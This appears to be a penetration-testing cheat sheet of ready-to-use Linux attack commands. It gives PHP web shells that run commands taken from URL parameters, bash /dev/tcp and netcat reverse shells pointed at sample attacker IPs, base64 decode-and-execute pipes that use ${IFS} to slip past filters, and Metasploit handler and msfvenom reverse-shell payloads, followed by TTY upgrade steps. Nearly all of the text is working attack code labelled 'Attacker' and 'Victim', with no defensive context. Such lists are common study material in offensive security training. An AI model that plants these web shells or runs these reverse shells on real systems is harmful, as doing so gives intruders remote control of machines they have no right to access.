# Linux  PHP > Rev Shell > Shell Upgrade Commands

##🐈‍⬛ PHP
```
<?php system($_GET['cmd']);?>

<?php
if (isset($_GET['command'])) {
    exec($_GET['command']);
}
?>
```
## 🎃 Bash TCP Shell

## ⭐ Attacker
```
nc -lvnp 4444
```
##🌙 Victim
```

/bin/bash -i 5<> /dev/tcp/10.10.14.13/4444 0<&5 1>&5 2>&5
bash -i >& /dev/tcp/10.10.14.13/4444 0>&1
0<&196;exec 196<>/dev/tcp/10.10.14.13/4444; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/10.10.14.13/4444 0<&1 2>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443
bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 
```
## 🎃 Meterpreter Shells

## ⭐ Attacker
```
msfconsole
search multi handler
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4242
exploit
```
##🌙 Victim

###🌙 Linux Staged reverse TCP

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf

```
###🌙 Linux Stageless reverse TCP

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf

```

## 🎃 Python Shell Upgrade
```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 🎃 TTY Shell Upgrade

```
script /dev/null -c bash
export TERM=xterm
# Control + z
stty raw -echo && fg
# Press Enter (Return) twice
```

## 🎃 Shell To Bash Upgrade
```
SHELL=/bin/bash script -q /dev/null
```
